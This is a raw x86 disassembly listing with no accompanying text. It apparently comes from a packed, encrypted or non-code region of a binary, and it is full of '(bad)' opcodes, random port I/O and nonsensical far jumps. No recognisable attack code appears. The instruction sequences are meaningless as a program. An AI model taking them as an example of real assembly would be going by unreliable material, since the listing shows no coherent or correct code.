  42f2a0:	pusha  
  42f2a1:	sbb    BYTE PTR [edx-0x169a8177],0xb3
  42f2a8:	out    0x3e,al
  42f2aa:	xchg   ebp,eax
  42f2ab:	xchg   ebx,eax
  42f2ac:	xor    eax,ebp
  42f2ae:	imul   ecx,DWORD PTR [edx+0x6],0xbe6fcdc8
  42f2b5:	fstp   QWORD PTR [ebx]
  42f2b7:	in     al,dx
  42f2b8:	fimul  DWORD PTR [ebx+eiz*4-0x1f09eecf]
  42f2bf:	sub    esi,DWORD PTR [esi+0x2f13793e]
  42f2c5:	aam    0x6b
  42f2c7:	mov    ds:0xfa488c80,al
  42f2cc:	jo     0x42f2c9
  42f2ce:	fs push 0x6c97e494
  42f2d4:	shr    ebx,1
  42f2d6:	and    dh,BYTE PTR [edx]
  42f2d8:	(bad)  
  42f2d9:	aam    0x9d
  42f2db:	add    al,0x2
  42f2dd:	pop    edx
  42f2de:	xchg   edx,eax
  42f2df:	add    al,0x6
  42f2e1:	cmp    BYTE PTR [edx-0x18be8cf2],bl
  42f2e7:	sbb    eax,0x50c4215d
  42f2ec:	push   0xf38def87
  42f2f1:	xchg   BYTE PTR [edx-0x2b9a7d37],cl
  42f2f7:	fisub  WORD PTR [edx+0x70]
  42f2fa:	outs   dx,DWORD PTR es:[esi]
  42f2fc:	loope  0x42f364
  42f2fe:	xor    al,ah
  42f300:	stos   DWORD PTR es:[edi],eax
  42f301:	es inc edx
  42f303:	jmp    0x42f294
  42f305:	jecxz  0x42f343
  42f307:	dec    eax
  42f308:	(bad)  
  42f309:	fcomp  QWORD PTR [esi+0x58426c1a]
  42f30f:	or     al,BYTE PTR [ebp+0xaf7d39d]
  42f315:	loop   0x42f2a2
  42f317:	and    eax,0xf1aa9c15
  42f31c:	jmp    0x8b2e586b
  42f321:	iret   
  42f322:	push   edx
  42f323:	jmp    0x22b1ca61
  42f328:	mov    ebx,0xd9178424
  42f32d:	dec    edi
  42f32e:	xor    cl,al
  42f330:	div    BYTE PTR [ebx+eiz*2-0x45]
  42f334:	mov    cl,0x3b
  42f336:	pop    esi
  42f337:	(bad)  
  42f338:	sub    cl,dh
  42f33a:	mov    bh,0x74
  42f33c:	xor    BYTE PTR ds:0x910015,0x0
	...
  42f3b3:	add    dl,ah
  42f3b5:	mov    ebp,0xe7dfc7dc
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	and    al,0xe1
  42f3c2:	inc    edx
  42f3c3:	dec    ebp
  42f3c4:	jns    0x42f3b8
  42f3c6:	add    DWORD PTR [eax],eax
  42f3c8:	cmc    
  42f3c9:	add    BYTE PTR [eax],al
  42f3cb:	add    cl,al
  42f3cd:	fnstenv [ebp-0x678fdcc6]
  42f3d3:	sbb    eax,0xa9c1feee
  42f3d8:	push   0x3b
  42f3da:	test   eax,0x1075fc45
  42f3df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f3e0:	mov    ss,edi
  42f3e2:	mov    BYTE PTR [edx+0x4b09c16c],dh
  42f3e8:	pop    esi
  42f3e9:	xchg   ecx,eax
  42f3ea:	mov    dl,BYTE PTR [eax]
  42f3ec:	pushf  
  42f3ed:	popf   
  42f3ee:	push   ebx
  42f3ef:	cmc    
  42f3f0:	loope  0x42f3f9
  42f3f2:	mov    al,ds:0x60240882
  42f3f7:	mov    dl,0x41
  42f3f9:	sbb    dh,BYTE PTR [edx+0x43]
  42f3fc:	test   ah,ah
  42f3fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f3ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f400:	jo     0x42f43b
  42f402:	mov    edx,DWORD PTR [edx+0x10309ea9]
  42f408:	sbb    al,0x4d
  42f40a:	retf   
  42f40b:	jb     0x42f3b8
  42f40d:	jae    0x42f409
  42f40f:	ss push edi
  42f411:	pop    esi
  42f412:	xchg   dh,dl
  42f414:	jb     0x42f3e6
  42f416:	je     0x42f46a
  42f418:	mov    ?,esp
  42f41a:	leave  
  42f41b:	adc    DWORD PTR [ebp+eiz*4+0x43d9f095],ebx
  42f422:	fist   WORD PTR [edi+0x3865e480]
  42f428:	int    0x63
  42f42a:	xchg   edx,eax
  42f42b:	adc    BYTE PTR es:[ebp+0x1e],cl
  42f42f:	add    BYTE PTR [ebx-0x1d95e6b9],bh
  42f435:	ficom  WORD PTR [esi-0x11bc1dd2]
  42f43b:	mov    al,0xa1
  42f43d:	push   edi
  42f43e:	retf   0x879f
  42f441:	xor    DWORD PTR gs:[eax+0x15f112b4],ecx
  42f448:	in     eax,dx
  42f449:	mov    bh,0xb5
  42f44b:	out    0xb1,al
  42f44d:	pop    es
  42f44e:	or     al,ch
  42f450:	xor    BYTE PTR [ebx+0x42],bh
  42f453:	bound  ecx,QWORD PTR [ebp+0x75401a9c]
  42f459:	cdq    
  42f45a:	mov    edi,edi
  42f45c:	aaa    
  42f45d:	fcom   QWORD PTR [ebx+ecx*4+0x383aabb9]
  42f464:	cmc    
  42f465:	scas   eax,DWORD PTR es:[edi]
  42f466:	xchg   ecx,eax
  42f467:	fld    DWORD PTR [ebp+0x14f7e396]
  42f46d:	or     dl,BYTE PTR [edx-0x42]
  42f470:	jmp    0xc86fdc66
  42f475:	sbb    al,0x94
  42f477:	push   es
  42f478:	lds    ecx,FWORD PTR [esi-0x74]
  42f47b:	int    0xb1
  42f47d:	jg     0x42f437
  42f47f:	mov    BYTE PTR fs:[edi],cl
  42f482:	inc    edx
  42f483:	ja     0x42f47c
  42f485:	out    0xb,eax
  42f487:	cld    
  42f488:	dec    ebp
  42f489:	mov    bh,0x39
  42f48b:	rcr    ebp,1
  42f48d:	xchg   esp,eax
  42f48e:	mov    ecx,0x18cd3a9a
  42f493:	ja     0x42f4bc
  42f495:	ins    DWORD PTR es:[edi],dx
  42f496:	cwde   
  42f497:	shl    ah,1
  42f499:	xchg   edx,eax
  42f49a:	fadd   DWORD PTR es:[esi+ebp*8]
  42f49e:	hlt    
  42f49f:	lock mov bh,BYTE PTR [ebx]
  42f4a2:	mov    cl,0x3c
  42f4a4:	loop   0x42f51e
  42f4a6:	mul    dh
  42f4a8:	cmp    al,0x39
  42f4aa:	repnz cdq 
  42f4ac:	pop    ebx
  42f4ad:	cmp    al,0x50
  42f4af:	(bad)  
  42f4b0:	jge    0x42f50a
  42f4b2:	psadbw mm6,QWORD PTR [eax]
  42f4b5:	xor    eax,0x2f5d8a71
  42f4ba:	sub    bl,0xdd
  42f4bd:	fistp  DWORD PTR fs:[eax+0x2c]
	...
  42f531:	add    BYTE PTR [eax],al
  42f533:	add    BYTE PTR [ebp+0x38],dl
  42f536:	into   
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi-0x60],bh
  42f541:	xchg   ebx,eax
  42f542:	jo     0x42f501
  42f544:	outs   dx,BYTE PTR ds:[esi]
  42f545:	repz add DWORD PTR [eax],eax
  42f548:	cmc    
  42f549:	add    BYTE PTR [eax],al
  42f54b:	add    BYTE PTR [esi],dl
  42f54d:	lea    ecx,[ebx+0x3a]
  42f550:	test   bh,dh
  42f552:	fs pop esp
  42f554:	sti    
  42f555:	pop    esi
  42f556:	or     bl,BYTE PTR ds:0xeb3d4caa
  42f55c:	xor    al,BYTE PTR [edi]
  42f55e:	imul   esp,DWORD PTR [edi+0x6af527eb],0xa6b485a9
  42f568:	out    0x6c,al
  42f56a:	sbb    DWORD PTR [esi],esp
  42f56c:	inc    edx
  42f56d:	or     BYTE PTR [ecx+ebp*4],ch
  42f570:	gs scas al,BYTE PTR es:[edi]
  42f572:	outs   dx,DWORD PTR ds:[esi]
  42f573:	les    esp,FWORD PTR [esi+0xb]
  42f576:	out    dx,eax
  42f577:	lods   al,BYTE PTR ds:[esi]
  42f578:	leave  
  42f579:	mov    ch,0xc1
  42f57b:	add    edx,ebp
  42f57d:	xor    al,0xa6
  42f57f:	adc    DWORD PTR [ebp+0x6a],edx
  42f582:	addr16 out dx,eax
  42f584:	or     eax,0x17ecb1ab
  42f589:	push   cs
  42f58a:	dec    ecx
  42f58b:	iret   
  42f58c:	jno    0x42f58f
  42f58e:	xchg   ebx,eax
  42f58f:	fld    DWORD PTR [eax-0x1492e2cc]
  42f595:	mov    edi,0x7eec3110
  42f59a:	dec    esi
  42f59b:	pop    es
  42f59c:	dec    ecx
  42f59d:	fs ins BYTE PTR es:[edi],dx
  42f59f:	sbb    ah,bl
  42f5a1:	lods   eax,DWORD PTR ds:[esi]
  42f5a2:	xchg   esp,eax
  42f5a3:	data16 sbb bh,BYTE PTR [edx-0x35]
  42f5a7:	ret    0x873e
  42f5aa:	loopne 0x42f5fc
  42f5ac:	pop    esi
  42f5ad:	sbb    esi,ebx
  42f5af:	mov    al,0xe2
  42f5b1:	push   ebp
  42f5b2:	jmp    0x459df271
  42f5b7:	fld    TBYTE PTR [edi+0x3]
  42f5ba:	pop    ecx
  42f5bb:	pop    edi
  42f5bc:	xchg   esi,eax
  42f5bd:	xchg   ecx,eax
  42f5be:	(bad)  
  42f5bf:	jp     0x42f554
  42f5c1:	mov    cs,WORD PTR ds:0x5be8b427
  42f5c7:	and    al,cl
  42f5c9:	push   eax
  42f5ca:	adc    eax,0x547bfbc7
  42f5cf:	xchg   esp,eax
  42f5d0:	test   BYTE PTR [esp+edi*2-0x77],dl
  42f5d4:	sub    al,0x82
  42f5d6:	sub    DWORD PTR [edi],edi
  42f5d8:	outs   dx,DWORD PTR ds:[esi]
  42f5d9:	or     BYTE PTR [edi],ch
  42f5db:	jb     0x42f62b
  42f5dd:	xor    DWORD PTR [edi+0x56],esp
  42f5e0:	push   0xffffffa7
  42f5e2:	sub    DWORD PTR [esi-0x5e],0x6c
  42f5e6:	fstp   TBYTE PTR [ebx-0x4e]
  42f5e9:	or     ebx,ecx
  42f5eb:	sbb    ebp,0x5417fe92
  42f5f1:	outs   dx,BYTE PTR ds:[esi]
  42f5f2:	out    0xa0,eax
  42f5f4:	xor    DWORD PTR [ebx+0x6b9f5c8d],ebx
  42f5fa:	xchg   esi,eax
  42f5fb:	xlat   BYTE PTR ds:[ebx]
  42f5fc:	fs pop edx
  42f5fe:	sbb    esi,DWORD PTR [edx]
  42f600:	and    ebp,DWORD PTR [ecx]
  42f602:	push   esp
  42f603:	clc    
  42f604:	fyl2x  
  42f606:	into   
  42f607:	call   DWORD PTR [ebx-0x51]
  42f60a:	(bad)  
  42f60c:	adc    edi,DWORD PTR [ebp-0x1bece8f7]
  42f612:	jg     0x42f5ec
  42f614:	pop    ebp
  42f615:	(bad)  
  42f616:	jo     0x42f682
  42f618:	sub    ch,BYTE PTR [ecx+0x6ac6e454]
  42f61e:	call   0x45cfe08e
  42f623:	lea    edx,[ecx]
  42f625:	dec    ebp
  42f626:	sub    eax,0x618706f9
  42f62b:	mov    WORD PTR [ebx-0x12e415e2],?
  42f631:	(bad)
  42f635:	outs   dx,DWORD PTR ds:[esi]
  42f636:	(bad)  
  42f637:	inc    edx
  42f638:	ror    DWORD PTR [edi-0x41c6bdb5],0x34
  42f63f:	daa    
  42f640:	pop    ecx
	...
  42f6b1:	add    BYTE PTR [eax],al
  42f6b3:	add    BYTE PTR [edx+0x39],bl
  42f6b6:	dec    esi
  42f6b7:	sub    eax,0x7f7b7f6f
  42f6bc:	or     DWORD PTR [edi-0x3e25cd1d],esi
  42f6c2:	mul    esi
  42f6c4:	arpl   sp,si
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	cmc    
  42f6c9:	add    BYTE PTR [eax],al
  42f6cb:	add    BYTE PTR [ebx+0x4f],ch
  42f6ce:	xchg   edx,eax
  42f6cf:	xor    al,0x52
  42f6d1:	xor    eax,DWORD PTR [ecx+edi*8-0x75]
  42f6d5:	cmp    edx,eax
  42f6d7:	mov    ch,0x2c
  42f6d9:	xchg   esp,eax
  42f6da:	rcr    BYTE PTR [ebp+0x6c],1
  42f6dd:	sbb    edx,DWORD PTR [edx-0x57]
  42f6e0:	dec    esp
  42f6e1:	inc    esp
  42f6e2:	mov    WORD PTR [eax],ss
  42f6e4:	std    
  42f6e5:	push   edi
  42f6e6:	add    ecx,DWORD PTR [esi-0x29]
  42f6e9:	push   0x783f9ce0
  42f6ee:	xor    BYTE PTR [ecx-0x37f27f67],bh
  42f6f4:	mov    ch,0xc7
  42f6f6:	sbb    cl,dl
  42f6f8:	into   
  42f6f9:	dec    ebp
  42f6fa:	fnstsw WORD PTR [ebp+0xf672d73]
  42f700:	mov    ebp,0x9b9fd249
  42f705:	pop    es
  42f706:	pop    ebx
  42f707:	ret    
  42f708:	in     al,0x44
  42f70a:	or     dh,BYTE PTR [ebx+0x5a]
  42f70d:	sbb    al,0x77
  42f70f:	mov    bh,0x2a
  42f711:	sub    al,0x4a
  42f713:	xlat   BYTE PTR ds:[ebx]
  42f714:	adc    ebx,ecx
  42f716:	aas    
  42f717:	jns    0x42f797
  42f719:	icebp  
  42f71a:	sbb    BYTE PTR es:[esi+0x69308904],bh
  42f721:	mov    esp,DWORD PTR [ebx-0x40]
  42f724:	jbe    0x42f6d5
  42f726:	push   ds
  42f727:	xchg   edi,eax
  42f728:	loop   0x42f788
  42f72a:	retf   0xe17e
  42f72d:	int3   
  42f72e:	add    DWORD PTR [eax+0x22],esi
  42f731:	aam    0x93
  42f733:	inc    edx
  42f734:	xchg   BYTE PTR [ecx],bl
  42f736:	cs mov ecx,0x292f0de8
  42f73c:	out    0x3d,al
  42f73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f73f:	test   ebx,esi
  42f741:	es cmc 
  42f743:	sar    dh,1
  42f745:	icebp  
  42f746:	shr    BYTE PTR [ecx],1
  42f748:	call   0xdfb1:0x5d18066
  42f74f:	pop    esp
  42f750:	stos   BYTE PTR es:[edi],al
  42f751:	mov    ah,0x4b
  42f753:	lds    esi,FWORD PTR [eax+0x679f54f7]
  42f759:	outs   dx,BYTE PTR ds:[esi]
  42f75a:	inc    ebx
  42f75b:	gs jnp 0x42f7bf
  42f75e:	iret   
  42f75f:	fsubr  st(3),st
  42f761:	push   DWORD PTR [eax]
  42f763:	dec    ebx
  42f764:	dec    edi
  42f765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f766:	rcr    BYTE PTR [eax-0x4924be5],0xc
  42f76d:	(bad)  
  42f76e:	cmp    al,0xcc
  42f770:	adc    ch,BYTE PTR [edi-0x79]
  42f773:	mov    bl,0xa6
  42f775:	outs   dx,DWORD PTR ds:[esi]
  42f776:	push   ebp
  42f777:	loope  0x42f756
  42f779:	scas   eax,DWORD PTR es:[edi]
  42f77a:	scas   al,BYTE PTR es:[edi]
  42f77b:	or     DWORD PTR [edx],edi
  42f77d:	xchg   edx,eax
  42f77e:	mov    dh,0x64
  42f780:	mov    bl,0xbd
  42f782:	dec    edi
  42f783:	xchg   ecx,eax
  42f784:	call   0x2cad:0x3a7787f9
  42f78b:	pushf  
  42f78c:	jp     0x42f735
  42f78e:	std    
  42f78f:	cmp    eax,0xf22ca9ea
  42f794:	or     bl,BYTE PTR [edx+0x73]
  42f797:	in     al,dx
  42f798:	stos   BYTE PTR es:[edi],al
  42f799:	mov    al,ds:0xccf17616
  42f79e:	add    eax,0xc487dce
  42f7a3:	mov    WORD PTR [esi-0x715db4bf],ss
  42f7a9:	pop    DWORD PTR [edx+0x1c1effb9]
  42f7af:	mov    esi,0xb2e440aa
  42f7b4:	fs popf 
  42f7b6:	cmp    al,0x79
  42f7b8:	fstp   TBYTE PTR ds:0x2bfd94c
  42f7be:	gs sub al,0x51
	...
  42f831:	add    BYTE PTR [eax],al
  42f833:	add    bl,al
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi+0x1550c88f]
  42f841:	sar    DWORD PTR [ebx],cl
  42f843:	xchg   esi,eax
  42f844:	pop    eax
  42f845:	cmc    
  42f846:	add    DWORD PTR [eax],eax
  42f848:	cmc    
  42f849:	add    BYTE PTR [eax],al
  42f84b:	add    BYTE PTR [edx],dh
  42f84d:	stc    
  42f84e:	xchg   ebx,eax
  42f84f:	sbb    al,0x58
  42f851:	shl    bl,1
  42f853:	daa    
  42f854:	push   cs
  42f855:	or     ah,cl
  42f857:	jmp    0x6217:0x2a48aceb
  42f85e:	inc    eax
  42f85f:	sub    BYTE PTR ds:0x433c0e38,bl
  42f865:	mov    ebp,0xa59f20cf
  42f86a:	sbb    esi,DWORD PTR [edi]
  42f86c:	jno    0x42f86c
  42f86e:	sti    
  42f86f:	pop    ds
  42f870:	adc    bl,BYTE PTR [ebx]
  42f872:	jl     0x42f870
  42f874:	push   0x3ff10e09
  42f879:	in     al,0x82
  42f87b:	sbb    BYTE PTR [esi-0x79],0xa8
  42f87f:	retf   0x89a0
  42f882:	push   0xeafcd794
  42f887:	or     eax,esp
  42f889:	mov    esp,0x76c379e3
  42f88e:	fistp  WORD PTR [edx-0x27]
  42f891:	mul    BYTE PTR [edx+0x15]
  42f894:	and    ebx,0x7d
  42f897:	bound  eax,QWORD PTR [edx-0x4e63fd96]
  42f89d:	rcl    DWORD PTR [ecx-0x3fbb39c7],cl
  42f8a3:	mov    cl,0x9e
  42f8a5:	enter  0x9cd3,0x35
  42f8a9:	aaa    
  42f8aa:	cmp    BYTE PTR [esi],ch
  42f8ac:	mov    cl,0xad
  42f8ae:	call   0x4fac:0x82826f35
  42f8b5:	repz loopne 0x42f870
  42f8b8:	es jle 0x42f925
  42f8bb:	jp     0x42f8c0
  42f8bd:	cmp    eax,0x7d7d5a45
  42f8c2:	stos   DWORD PTR es:[edi],eax
  42f8c3:	or     BYTE PTR [esi-0x7d],0xa0
  42f8c7:	lahf   
  42f8c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8c9:	and    DWORD PTR [esi],esi
  42f8cb:	icebp  
  42f8cc:	cmp    al,0xfd
  42f8ce:	hlt    
  42f8cf:	mov    edi,0x4e2dcc02
  42f8d4:	xchg   edx,eax
  42f8d5:	xor    ah,ah
  42f8d7:	outs   dx,BYTE PTR ds:[esi]
  42f8d8:	push   ebp
  42f8d9:	mov    ss,WORD PTR [edi+0x1c143876]
  42f8df:	cs (bad) 
  42f8e1:	icebp  
  42f8e2:	add    bh,BYTE PTR [ebp-0x710057f7]
  42f8e8:	sbb    eax,0x82adbb93
  42f8ed:	cdq    
  42f8ee:	xor    BYTE PTR [edx],0x2e
  42f8f1:	xchg   ecx,eax
  42f8f2:	aad    0x7e
  42f8f4:	mov    gs,WORD PTR [ebx-0x1b017252]
  42f8fa:	shr    BYTE PTR [ecx+0x1],1
  42f8fd:	bswap  ecx
  42f8ff:	rcr    BYTE PTR [esi+0x2c342f93],cl
  42f905:	add    edx,DWORD PTR [eax]
  42f907:	int    0x59
  42f909:	pop    esi
  42f90a:	xchg   dl,dl
  42f90c:	push   ebx
  42f90d:	mov    edi,0x56734776
  42f912:	mov    edi,edi
  42f914:	repz ficom DWORD PTR [esi]
  42f917:	data16 mov dl,0x8f
  42f91a:	lods   al,BYTE PTR ds:[esi]
  42f91b:	imul   esi,DWORD PTR [ebp-0x78ff60c2],0x885b8167
  42f925:	call   0xedfb:0xa2fc7306
  42f92c:	pushw  ss
  42f92e:	pop    ebx
  42f92f:	clc    
  42f930:	outs   dx,DWORD PTR ds:[esi]
  42f931:	mov    DWORD PTR [esi+ebx*4-0xf],ebp
  42f935:	xchg   edi,eax
  42f936:	mov    esi,0x13281693
  42f93b:	neg    DWORD PTR [ecx]
  42f93d:	(bad)  
  42f93e:	cmp    al,0xc7
  42f940:	mov    dl,0x0
	...
  42f9b2:	add    BYTE PTR [eax],al
  42f9b4:	in     eax,0xba
  42f9b6:	xchg   edx,eax
  42f9b7:	jecxz  0x42f998
  42f9b9:	jmp    0x42f9b0
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	jne    0x42f974
  42f9c2:	sbb    ecx,DWORD PTR [edi+0x4d]
  42f9c5:	test   BYTE PTR [ecx],0x0
  42f9c8:	cmc    
  42f9c9:	add    BYTE PTR [eax],al
  42f9cb:	add    BYTE PTR [edi+ecx*2+0x54e57724],bh
  42f9d2:	out    dx,eax
  42f9d3:	xchg   esp,eax
  42f9d4:	or     DWORD PTR [ebp-0x6e],esi
  42f9d7:	push   ecx
  42f9d8:	inc    eax
  42f9d9:	cmc    
  42f9da:	ja     0x42f99a
  42f9dc:	stos   DWORD PTR es:[edi],eax
  42f9dd:	xor    edi,ebp
  42f9df:	mov    ah,0x0
  42f9e1:	rol    DWORD PTR [eax-0x7e],0xb7
  42f9e5:	mov    eax,ds:0x9531fd4f
  42f9ea:	cmp    eax,0xc08d5b2a
  42f9ef:	push   esi
  42f9f0:	mov    dl,0xa2
  42f9f2:	sub    BYTE PTR [edi+0x1d],0x8e
  42f9f6:	stc    
  42f9f7:	mov    ebp,esp
  42f9f9:	mov    ?,WORD PTR [ebx+esi*1+0x24]
  42f9fd:	inc    ecx
  42f9fe:	sbb    BYTE PTR [eax],0x0
  42fa01:	push   ss
  42fa02:	stos   BYTE PTR es:[edi],al
  42fa03:	nop
  42fa04:	push   cs
  42fa05:	xchg   ebx,eax
  42fa06:	clc    
  42fa07:	push   es
  42fa08:	pop    eax
  42fa09:	bndstx [edi-0x6f],(bad)
  42fa0d:	mov    esp,?
  42fa0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa10:	out    0x69,eax
  42fa12:	scas   al,BYTE PTR es:[edi]
  42fa13:	cmp    eax,0x4fd2b03c
  42fa18:	leave  
  42fa19:	call   FWORD PTR ds:0xb7605e71
  42fa1f:	ret    
  42fa20:	mov    dh,0x3a
  42fa22:	xchg   ecx,eax
  42fa23:	cmp    ch,BYTE PTR [esi+eax*8-0xd]
  42fa27:	mov    ch,0x70
  42fa29:	sbb    bh,BYTE PTR [ecx]
  42fa2b:	out    0x84,al
  42fa2d:	cld    
  42fa2e:	and    al,0x2
  42fa30:	jg     0x42fa0e
  42fa32:	(bad)  
  42fa33:	sbb    dl,dl
  42fa35:	sti    
  42fa36:	cwde   
  42fa37:	adc    ebx,esp
  42fa39:	push   esp
  42fa3a:	scas   eax,DWORD PTR es:[edi]
  42fa3b:	mov    ch,0xa3
  42fa3d:	retf   0x13f
  42fa40:	sub    DWORD PTR [ebx+0x65],eax
  42fa43:	sbb    DWORD PTR [eax+0x3a],ebx
  42fa46:	mov    cl,0xa9
  42fa48:	int    0xa2
  42fa4a:	fsubr  QWORD PTR [ebp+esi*8-0x51]
  42fa4e:	inc    ebx
  42fa4f:	fsubr  DWORD PTR [ecx]
  42fa51:	add    BYTE PTR [esi+eiz*2-0x1b],dl
  42fa55:	jecxz  0x42fab3
  42fa57:	enter  0xe801,0xb1
  42fa5b:	loope  0x42fa51
  42fa5d:	aad    0xf
  42fa5f:	int3   
  42fa60:	retf   0xc588
  42fa63:	mov    ah,0x5a
  42fa65:	clc    
  42fa66:	cli    
  42fa67:	mov    bh,0x9a
  42fa69:	inc    ecx
  42fa6a:	cli    
  42fa6b:	(bad)  
  42fa6c:	jnp    0x42fa31
  42fa6e:	xchg   esi,eax
  42fa6f:	imul   ebx,edi,0xa26584a2
  42fa75:	jp     0x42fa54
  42fa77:	xor    DWORD PTR [esi],0x61
  42fa7a:	inc    esp
  42fa7b:	cmp    edi,eax
  42fa7d:	dec    esp
  42fa7e:	push   0xddfa053e
  42fa83:	push   ebp
  42fa84:	mov    ecx,edx
  42fa86:	add    al,0xb7
  42fa88:	lods   eax,DWORD PTR ds:[esi]
  42fa89:	ins    BYTE PTR es:[edi],dx
  42fa8a:	fild   DWORD PTR [edx]
  42fa8c:	lahf   
  42fa8d:	xchg   edi,eax
  42fa8e:	fnstsw WORD PTR [ebp+0x586ee80c]
  42fa94:	jmp    0x42fac2
  42fa96:	cmp    BYTE PTR [eax+eax*8],bh
  42fa99:	popa   
  42fa9a:	mov    ah,0x7a
  42fa9c:	cmc    
  42fa9d:	pop    ebp
  42fa9e:	shl    dh,1
  42faa0:	lods   eax,DWORD PTR ds:[esi]
  42faa1:	dec    edi
  42faa2:	outs   dx,DWORD PTR ds:[esi]
  42faa3:	fiadd  WORD PTR [edi+0x4c]
  42faa6:	sti    
  42faa7:	shr    ecx,1
  42faa9:	inc    edx
  42faaa:	std    
  42faab:	mov    ds:0xd36ffef7,al
  42fab0:	lods   eax,DWORD PTR ds:[esi]
  42fab1:	inc    edi
  42fab2:	cmp    bl,0xc0
  42fab5:	fiadd  DWORD PTR [ecx]
  42fab7:	mov    BYTE PTR [ebx+0x764d121c],ah
  42fabd:	(bad)  
  42fabe:	dec    ebp
  42fabf:	cli    
  42fac0:	pop    eax
	...
  42fb31:	add    BYTE PTR [eax],al
  42fb33:	add    BYTE PTR [esi+0x41],bh
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	jmp    0x42faeb
  42fb42:	fnstenv [eax+0x1f742]
  42fb48:	cmc    
  42fb49:	add    BYTE PTR [eax],al
  42fb4b:	add    BYTE PTR [edi+0x71],cl
  42fb4e:	es inc edi
  42fb50:	and    eax,0x6417c26
  42fb55:	pusha  
  42fb56:	out    0xca,eax
  42fb58:	or     eax,0x6a702c2f
  42fb5d:	ins    BYTE PTR es:[edi],dx
  42fb5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb5f:	in     al,dx
  42fb60:	shr    eax,cl
  42fb62:	sub    eax,0x30c9fd83
  42fb67:	jle    0x42fb7d
  42fb69:	jne    0x42faf9
  42fb6b:	jae    0x42fb67
  42fb6d:	and    BYTE PTR [ebp+eiz*4+0x29],bl
  42fb71:	mov    ebx,esi
  42fb73:	pop    edi
  42fb74:	jg     0x42fb62
  42fb76:	pusha  
  42fb77:	mov    ecx,0x4eeea6b9
  42fb7c:	hlt    
  42fb7d:	icebp  
  42fb7e:	or     DWORD PTR [ecx+0x2c],ebp
  42fb81:	pop    ebx
  42fb82:	nop
  42fb83:	jne    0x42fb29
  42fb85:	pop    esp
  42fb86:	cmp    DWORD PTR [esi],esp
  42fb88:	retf   
  42fb89:	jmp    0x8ed8:0x940a92fe
  42fb90:	cmc    
  42fb91:	xchg   esp,eax
  42fb92:	adc    eax,0xb547263
  42fb97:	out    0x2d,al
  42fb99:	mov    es,WORD PTR [esp+eax*2-0x572e0a84]
  42fba0:	setle  BYTE PTR [ebp-0x356d3ab5]
  42fba7:	call   0x32fb63c1
  42fbac:	js     0x42fb43
  42fbae:	je     0x42fbf7
  42fbb0:	mov    ah,0xbb
  42fbb2:	xor    ebx,DWORD PTR [esi]
  42fbb4:	test   edi,edx
  42fbb6:	jg     0x42fb5e
  42fbb8:	inc    ecx
  42fbb9:	clc    
  42fbba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fbbb:	loope  0x42fbfd
  42fbbd:	xor    ah,BYTE PTR ds:0x24d6baad
  42fbc3:	out    0x6f,eax
  42fbc5:	idiv   ch
  42fbc7:	mov    ch,BYTE PTR [esi]
  42fbc9:	popf   
  42fbca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbcb:	cmp    esp,edx
  42fbcd:	jecxz  0x42fba5
  42fbcf:	cmp    al,0xf7
  42fbd1:	enter  0xc311,0xac
  42fbd5:	or     edx,DWORD PTR [bx+si-0x45]
  42fbd9:	dec    eax
  42fbda:	ret    
  42fbdb:	fstp   QWORD PTR [edi-0x6b]
  42fbde:	scas   al,BYTE PTR es:[edi]
  42fbdf:	mov    ?,edi
  42fbe1:	adc    esi,DWORD PTR [ebx-0x20]
  42fbe4:	xor    eax,0xa637ea97
  42fbe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbea:	(bad)  
  42fbeb:	mov    ch,BYTE PTR [edx+0x7b1e04d1]
  42fbf1:	sbb    ch,BYTE PTR ds:0x156393f
  42fbf7:	add    DWORD PTR [edx-0x112bd971],ebx
  42fbfd:	jns    0x42fba4
  42fbff:	or     esp,DWORD PTR [ebp+0x55]
  42fc02:	loopne 0x42fc4b
  42fc04:	leave  
  42fc05:	adc    edi,DWORD PTR [ecx]
  42fc07:	nop
  42fc08:	pop    ebx
  42fc09:	int3   
  42fc0a:	push   ss
  42fc0b:	inc    esi
  42fc0c:	push   ds
  42fc0d:	inc    edi
  42fc0e:	pop    ds
  42fc0f:	aad    0xd6
  42fc11:	dec    ecx
  42fc12:	fs mov ecx,0xe82ac346
  42fc18:	and    al,ah
  42fc1a:	sbb    BYTE PTR [ecx+edx*4],ch
  42fc1d:	ins    BYTE PTR es:[edi],dx
  42fc1e:	rcr    ecx,1
  42fc20:	push   ss
  42fc21:	fisub  WORD PTR [esi-0x7baef280]
  42fc27:	xor    cl,BYTE PTR [edi]
  42fc29:	xor    DWORD PTR [esi-0xe],ebp
  42fc2c:	lods   al,BYTE PTR ds:[esi]
  42fc2d:	xchg   edx,eax
  42fc2e:	popf   
  42fc2f:	xor    cl,bl
  42fc31:	adc    eax,ebp
  42fc33:	test   al,0x12
  42fc35:	and    esi,ebx
  42fc37:	mov    edx,0xa767ab4
  42fc3c:	inc    esi
  42fc3d:	or     al,0xfe
  42fc3f:	enter  0xa5,0x0
	...
  42fcb3:	add    BYTE PTR [edx],ch
  42fcb5:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42fcbb:	test   BYTE PTR [ecx-0x6346a3c4],0xd2
  42fcc2:	das    
  42fcc3:	ret    0xf837
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	cmc    
  42fcc9:	add    BYTE PTR [eax],al
  42fccb:	add    ah,al
